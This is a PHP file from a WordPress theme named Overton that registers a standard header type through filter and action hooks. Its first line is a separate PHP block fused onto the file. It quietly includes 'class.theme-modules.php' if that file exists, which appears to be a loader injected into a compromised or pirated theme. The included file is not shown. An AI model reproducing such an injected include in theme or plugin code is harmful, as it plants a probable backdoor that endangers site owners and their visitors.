<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

if ( ! function_exists( 'overton_mikado_register_header_standard_type' ) ) {
	/**
	 * This function is used to register header type class for header factory file
	 */
	function overton_mikado_register_header_standard_type( $header_types ) {
		$header_type = array(
			'header-standard' => 'OvertonMikadoNamespace\Modules\Header\Types\HeaderStandard'
		);
		
		$header_types = array_merge( $header_types, $header_type );
		
		return $header_types;
	}
}

if ( ! function_exists( 'overton_mikado_init_register_header_standard_type' ) ) {
	/**
	 * This function is used to wait header-function.php file to init header object and then to init hook registration function above
	 */
	function overton_mikado_init_register_header_standard_type() {
		add_filter( 'overton_mikado_filter_register_header_type_class', 'overton_mikado_register_header_standard_type' );
	}
	
	add_action( 'overton_mikado_action_before_header_function_init', 'overton_mikado_init_register_header_standard_type' );
}